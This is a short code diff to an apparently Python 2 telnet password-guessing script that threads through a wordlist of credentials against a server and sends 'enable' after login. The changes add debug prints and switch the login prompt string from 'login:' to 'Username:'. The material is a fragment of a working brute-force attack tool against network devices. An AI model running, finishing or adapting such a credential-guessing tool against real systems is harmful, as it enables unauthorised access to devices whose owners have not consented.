@@ -22,6 +22,7 @@ except(IOError):
 	sys.exit(1)
 
 wordlist=copy(words)
+print wordlist
 def reloader():
 	for word in wordlist:
 		words.append(word)
@@ -46,12 +47,14 @@ def getword():
 class Worker(threading.Thread):
 	def run(self):
 		value,user=getword()
+		print value+' +'+user
 		try:
 			print "Go"
 			tn=telnetlib.Telnet(server)
-			tn.read_until("login: ")
+			tn.read_until("Username: ")
 			tn.write(user+"\n")
 			if password:
+				print 'wrong'
 				tn.read_until("Password: ")
 				tn.write(value + "\n")
 			tn.write("enable\n")
